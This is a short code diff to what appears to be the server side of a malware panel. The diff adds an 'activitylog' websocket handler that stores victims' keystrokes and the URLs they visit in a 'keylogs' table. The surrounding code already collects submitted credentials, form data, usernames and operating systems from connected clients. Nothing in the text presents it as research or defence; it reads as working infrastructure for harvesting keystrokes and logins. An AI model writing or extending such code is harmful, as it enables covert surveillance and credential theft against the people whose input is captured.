@@ -28,6 +28,9 @@ module.exports = function initializeClientApi(appClients, server) {
           case "addsubmittedcredentials":
             handleAddSubmittedCredentials(client_id, data[1]);
             break;
+          case "activitylog":
+            handleActivityLog(client_id, data[1]);
+            break;
         }
       } catch (err) {
         console.error(err);
@@ -128,6 +131,15 @@ function handleAddSubmittedCredentials(client_id, credentials) {
     credentials.metadata.timestamp,
     JSON.stringify(credentials.formData)
   );
+}
+function handleActivityLog(client_id, log) {
+  const stmt = db.prepare(
+    `
+      INSERT INTO keylogs (client_id, timestamp, keystrokes, url)
+      VALUES (?, ?, ?, ?)
+    `
+  );
+  stmt.run(client_id, log.timestamp, log.keys, log.url);
 }
 function handleAlive(ws, data) {
   const { client_id, os, username } = data;
